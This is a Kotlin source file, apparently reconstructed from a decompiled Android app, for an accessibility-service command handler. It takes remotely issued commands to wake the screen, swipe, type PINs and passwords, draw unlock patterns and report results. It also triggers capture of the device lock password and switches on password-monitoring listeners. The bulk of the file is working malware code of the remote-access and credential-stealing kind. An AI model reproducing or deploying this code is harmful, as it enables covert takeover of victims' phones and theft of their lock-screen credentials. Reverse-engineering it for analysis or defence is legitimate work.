package com.storm.safe.rock.service.modules.command

import android.app.KeyguardManager
import android.os.PowerManager
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.modules.unlock.PinPadInputManager
import com.storm.safe.rock.service.modules.unlock.ScreenUnlockHelper
import kotlinx.coroutines.delay
import org.json.JSONObject

/**
 * Handles device unlock and power management commands.
 *
 * Reverse-engineered from JADX: C0352a9 (a9, 1495 lines).
 * Vendor name: UnlockCommandHandler
 *
 * Supported commands:
 * - POWER_WAKE, POWER_SLEEP
 * - SMART_UNLOCK_SWIPE, NUMERIC_PIN_INPUT
 * - SMART_CONFIRM_DETECTION, UNLOCK_DEVICE
 * - GET_DEVICE_PASSWORD, SMART_NUMERIC_UNLOCK
 * - SMART_MIXED_UNLOCK, ENABLE_PASSWORD_MONITORING
 *
 * Static methods:
 * - a3 → clickConfirmButton
 * - a4 → findEditableNodes
 * - a9 → fillPasswordField
 * - b0 → sendUnlockResult
 */
class UnlockCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "UnlockCmdHandler"

        fun sendUnlockResult(context: CommandContext, success: Boolean, message: String) =
            ScreenUnlockHelper.sendUnlockResult(context, success, message)

        fun clickConfirmButton(service: android.accessibilityservice.AccessibilityService?) =
            ScreenUnlockHelper.clickConfirmButton(service)

        fun findEditableNodes(node: AccessibilityNodeInfo, result: MutableList<AccessibilityNodeInfo>) =
            ScreenUnlockHelper.findEditableNodes(node, result)

        fun fillPasswordField(service: android.accessibilityservice.AccessibilityService?, password: String) =
            ScreenUnlockHelper.fillPasswordField(service, password)
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "POWER_WAKE",
        "POWER_SLEEP",
        "SMART_UNLOCK_SWIPE",
        "NUMERIC_PIN_INPUT",
        "SMART_CONFIRM_DETECTION",
        "UNLOCK_DEVICE",
        "GET_DEVICE_PASSWORD",
        "SMART_NUMERIC_UNLOCK",
        "SMART_MIXED_UNLOCK",
        "ENABLE_PASSWORD_MONITORING"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "POWER_WAKE" -> handlePowerWake(context)
            "POWER_SLEEP" -> handlePowerSleep(context)
            "SMART_UNLOCK_SWIPE" -> handleSmartUnlockSwipe(context)
            "NUMERIC_PIN_INPUT" -> handleNumericPinInput(params, context)
            "SMART_CONFIRM_DETECTION" -> handleSmartConfirmDetection(params, context)
            "UNLOCK_DEVICE" -> handleUnlockDevice(params, context)
            "GET_DEVICE_PASSWORD" -> handleGetDevicePassword(params, context)
            "SMART_NUMERIC_UNLOCK" -> handleSmartNumericUnlock(params, context)
            "SMART_MIXED_UNLOCK" -> handleSmartMixedUnlock(params, context)
            "ENABLE_PASSWORD_MONITORING" -> handleEnablePasswordMonitoring(context)
        }
    }

    private fun handlePowerWake(context: CommandContext) {
        Log.d(TAG, "点亮屏幕")
        try {
            val pm = context.service?.getSystemService("power") as? PowerManager
                ?: throw IllegalStateException("PowerManager not available")
            @Suppress("DEPRECATION")
            val wakeLock = pm.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or
                    PowerManager.ACQUIRE_CAUSES_WAKEUP or
                    PowerManager.ON_AFTER_RELEASE,
                "SystemHelper:WakeLock"
            )
            wakeLock.acquire(30_000L)
            Log.d(TAG, "屏幕已点亮（保持30秒）")
        } catch (e: Exception) {
            Log.e(TAG, "点亮屏幕失败", e)
        }
    }

    private fun handlePowerSleep(context: CommandContext) {
        Log.d(TAG, "锁定屏幕")
        try {
            // GLOBAL_ACTION_LOCK_SCREEN = 8
            val result = context.service?.performGlobalAction(8) ?: false
            if (result) {
                Log.d(TAG, "屏幕已锁定")
            } else {
                Log.w(TAG, "锁定屏幕失败（可能需要Android 9.0+）")
            }
        } catch (e: Exception) {
            Log.e(TAG, "锁定屏幕失败", e)
        }
    }

    private fun handleSmartUnlockSwipe(context: CommandContext) {
        Log.d(TAG, "执行智能上滑解锁")
        try {
            val service = context.service ?: return
            ScreenUnlockHelper.performSwipeUp(service)
            Log.d(TAG, "智能上滑解锁已执行")
        } catch (e: Exception) {
            Log.e(TAG, "智能上滑解锁失败", e)
        }
    }

    private suspend fun handleNumericPinInput(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行数字密码输入")
        try {
            val digit = params?.optString("digit", "")?.ifEmpty {
                params.optString("pin", "")
            } ?: ""

            if (digit.isEmpty()) {
                Log.w(TAG, "数字密码输入参数无效: digit/pin 为空")
                return
            }

            val service = context.service
            var screenWidth = params?.optInt("screenWidth", 0) ?: 0
            var screenHeight = params?.optInt("screenHeight", 0) ?: 0

            if ((screenWidth <= 0 || screenHeight <= 0) && service != null) {
                val metrics = service.resources.displayMetrics
                screenWidth = metrics.widthPixels
                screenHeight = metrics.heightPixels
                Log.d(TAG, "自动检测屏幕尺寸: ${screenWidth}x${screenHeight}")
            }

            if (screenWidth <= 0 || screenHeight <= 0) {
                Log.w(TAG, "数字密码输入参数无效: 屏幕尺寸无法获取")
                return
            }

            val index = params?.optInt("index", 0) ?: 0
            val total = params?.optInt("total", 0) ?: 0

            if (index <= 1 && service != null) {
                Log.d(TAG, "数字密码输入前唤醒屏幕")
                handlePowerWake(context)
                delay(500L)
            }

            if (service == null) {
                Log.w(TAG, "AccessibilityService 未初始化，无法执行 PIN 输入")
                return
            }

            val pinPadManager = PinPadInputManager(service)
            pinPadManager.inputNumericPassword(digit, screenWidth, screenHeight)
            Log.d(TAG, "数字密码输入已执行: $digit ($index/$total)")
        } catch (e: Exception) {
            Log.e(TAG, "数字密码输入失败", e)
        }
    }

    private fun handleSmartConfirmDetection(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行智能确认按钮检测")
        try {
            val passwordType = params?.optString("passwordType", "") ?: ""
            val screenWidth = params?.optInt("screenWidth", 0) ?: 0
            val screenHeight = params?.optInt("screenHeight", 0) ?: 0

            if (screenWidth <= 0 || screenHeight <= 0) {
                Log.w(TAG, "智能确认检测参数无效")
                return
            }

            val service = context.service ?: return
            clickConfirmButton(service)
            Log.d(TAG, "智能确认按钮检测完成: passwordType=$passwordType")
        } catch (e: Exception) {
            Log.e(TAG, "智能确认按钮检测失败", e)
        }
    }

    private suspend fun handleUnlockDevice(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "[UNLOCK_DEVICE] 收到图案解锁命令")
        try {
            val service = context.service
            if (service != null && ScreenUnlockHelper.isDeviceUnlocked(service)) {
                Log.d(TAG, "[UNLOCK_DEVICE] 设备已解锁，跳过")
                return
            }

            val dataObj = params?.optJSONObject("data")
            val patternArray = dataObj?.optJSONArray("pattern")
                ?: params?.optJSONArray("pattern")

            if (patternArray == null || patternArray.length() < 4) {
                Log.w(TAG, "[UNLOCK_DEVICE] 图案解锁参数无效: length=${patternArray?.length() ?: 0}")
                return
            }

            val points = mutableListOf<Int>()
            for (i in 0 until patternArray.length()) {
                points.add(patternArray.optInt(i))
            }
            Log.d(TAG, "[UNLOCK_DEVICE] 完整图案: ${points.joinToString(",")} (${points.size}个点)")

            Log.d(TAG, "[UNLOCK_DEVICE] 步骤1: 唤醒屏幕")
            handlePowerWake(context)
            delay(1000L)

            if (service != null && !ScreenUnlockHelper.isPasswordInputVisible(service)) {
                Log.d(TAG, "[UNLOCK_DEVICE] 步骤2: 执行上滑解锁手势")
                ScreenUnlockHelper.performSwipeUp(service)
                delay(1500L)
            } else {
                Log.d(TAG, "[UNLOCK_DEVICE] 步骤2: 密码输入界面已可见，跳过上滑")
                delay(500L)
            }

            Log.d(TAG, "[UNLOCK_DEVICE] 步骤3: 开始绘制图案")
            if (service != null) {
                ScreenUnlockHelper.dispatchPatternGesture(service, points)
            } else {
                Log.w(TAG, "[UNLOCK_DEVICE] Service 为空，无法绘制图案")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[UNLOCK_DEVICE] 图案解锁失败", e)
        }
    }

    private fun handleGetDevicePassword(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "GET_DEVICE_PASSWORD received")
        val passwordType = params?.optString("passwordType", "") ?: ""
        Log.d(TAG, "passwordType param: $passwordType")

        val resolvedType = when {
            passwordType == "PIN_4" -> "PIN_4"
            passwordType == "PIN_6" -> "PIN_6"
            passwordType == "PATTERN" -> "PATTERN"
            else -> "PIN_6"
        }

        val service = context.service ?: return
        val km = service.getSystemService("keyguard") as? android.app.KeyguardManager

        if (km != null && km.isKeyguardLocked) {
            service.pendingPasswordType = resolvedType
            Log.d(TAG, "Device locked, saved pendingPasswordType=$resolvedType, waiting for USER_PRESENT")
        } else {
            service.pendingPasswordType = null
            Log.d(TAG, "Device unlocked, triggering immediate password capture: $resolvedType")
            service.doLaunchSystemPasswordCapture(isInstallationFlow = false)
        }
    }

    private suspend fun handleSmartNumericUnlock(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "[智能解锁] 开始执行带判断的数字解锁")
        try {
            val password = params?.optString("password", "") ?: ""
            val service = context.service
            var screenWidth = params?.optInt("screenWidth", 0) ?: 0
            var screenHeight = params?.optInt("screenHeight", 0) ?: 0

            if ((screenWidth <= 0 || screenHeight <= 0) && service != null) {
                val metrics = service.resources.displayMetrics
                screenWidth = metrics.widthPixels
                screenHeight = metrics.heightPixels
            }

            if (password.isEmpty() || screenWidth <= 0 || screenHeight <= 0) {
                Log.e(TAG, "[智能解锁] 参数无效: password=${password.length}位, screen=${screenWidth}x${screenHeight}")
                sendUnlockResult(context, false, "参数无效")
                return
            }

            if (service != null && ScreenUnlockHelper.isDeviceUnlocked(service)) {
                Log.d(TAG, "[智能解锁] 设备已解锁，无需解锁")
                sendUnlockResult(context, true, "设备未锁屏")
                return
            }

            Log.d(TAG, "[智能解锁] 步骤1: 唤醒屏幕")
            handlePowerWake(context)
            delay(500L)

            val inputAlreadyVisible = service != null && ScreenUnlockHelper.isPasswordInputVisible(service)
            if (!inputAlreadyVisible) {
                Log.d(TAG, "[智能解锁] 步骤2: 执行上滑")
                if (service != null) ScreenUnlockHelper.performSwipeUp(service)
            } else {
                Log.d(TAG, "[智能解锁] 步骤2: PIN 键盘已可见，跳过上滑")
            }

            Log.d(TAG, "[智能解锁] 步骤3: 检测数字键盘")
            val keypadFound = if (inputAlreadyVisible) true
                else ScreenUnlockHelper.waitForNumericKeypad(context, 3000L)
            if (keypadFound) {
                val waitMs = if (inputAlreadyVisible) 300L else 1000L
                Log.d(TAG, "[智能解锁] 检测到数字键盘，等待${waitMs}ms")
                delay(waitMs)
            } else {
                Log.w(TAG, "[智能解锁] 未检测到数字键盘，尝试继续输入")
            }

            Log.d(TAG, "[智能解锁] 步骤4: 输入密码 (${password.length}位)")
            if (service == null) {
                sendUnlockResult(context, false, "Service未初始化")
                return
            }
            val pinPadManager = PinPadInputManager(service)
            pinPadManager.inputNumericPassword(password, screenWidth, screenHeight)

            Log.d(TAG, "[智能解锁] 步骤5: 检测解锁结果")
            delay(800L)
            val unlocked = ScreenUnlockHelper.waitForUnlockResult(context, 5000L)
            if (unlocked) {
                Log.d(TAG, "[智能解锁] 解锁成功")
                sendUnlockResult(context, true, "解锁成功")
            } else {
                Log.w(TAG, "[智能解锁] 解锁失败，密码可能错误")
                sendUnlockResult(context, false, "解锁失败，密码可能错误")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[智能解锁] 执行异常", e)
            sendUnlockResult(context, false, "执行异常: ${e.message}")
        }
    }

    private suspend fun handleSmartMixedUnlock(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "[混合解锁] 开始执行字母数字密码解锁")
        try {
            val password = params?.optString("password", "") ?: ""
            if (password.isEmpty()) {
                Log.e(TAG, "[混合解锁] 密码为空")
                sendUnlockResult(context, false, "密码为空")
                return
            }

            val service = context.service
            if (service != null && ScreenUnlockHelper.isDeviceUnlocked(service)) {
                Log.d(TAG, "[混合解锁] 设备已解锁，无需解锁")
                sendUnlockResult(context, true, "设备未锁屏")
                return
            }

            Log.d(TAG, "[混合解锁] 步骤1: 唤醒屏幕")
            handlePowerWake(context)
            delay(500L)

            val inputAlreadyVisible = service != null && ScreenUnlockHelper.isPasswordInputVisible(service)
            if (!inputAlreadyVisible) {
                Log.d(TAG, "[混合解锁] 步骤2: 执行上滑")
                if (service != null) ScreenUnlockHelper.performSwipeUp(service)
                delay(1200L)
            } else {
                Log.d(TAG, "[混合解锁] 步骤2: 密码输入界面已可见，跳过上滑")
                delay(300L)
            }

            Log.d(TAG, "[混合解锁] 步骤3: 查找输入框并注入密码")
            val filled = ScreenUnlockHelper.fillPasswordField(service, password)
            if (!filled) {
                Log.w(TAG, "[混合解锁] 未找到输入框，尝试剪贴板输入")
                try {
                    val clipboard = service?.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
                    clipboard?.setPrimaryClip(android.content.ClipData.newPlainText("pwd", password))
                } catch (_: Exception) {}
                delay(800L)
            }

            Log.d(TAG, "[混合解锁] 步骤4: 尝试点击确认按钮")
            ScreenUnlockHelper.clickConfirmButton(service)
            delay(800L)

            val unlocked = ScreenUnlockHelper.waitForUnlockResult(context, 5000L)
            if (unlocked) {
                Log.d(TAG, "[混合解锁] 解锁成功")
                sendUnlockResult(context, true, "解锁成功")
            } else {
                Log.w(TAG, "[混合解锁] 解锁失败，密码可能错误")
                sendUnlockResult(context, false, "解锁失败，密码可能错误")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[混合解锁] 执行异常", e)
            sendUnlockResult(context, false, "执行异常: ${e.message}")
        }
    }

    private fun handleEnablePasswordMonitoring(context: CommandContext) {
        Log.d(TAG, "收到启用密码监听命令")
        try {
            val service = context.service ?: return
            service.getSharedPreferences("cipher_config", 0).edit()
                .putBoolean("cipher_completed", false).apply()
            service.isCipherCaptureEnabled = true
            service.cipherCaptureManager?.startListening()
            Log.d(TAG, "密码监听模式已启用 (cipher_completed=false, listening started)")
        } catch (e: Exception) {
            Log.e(TAG, "启用密码监听失败", e)
        }
    }
}
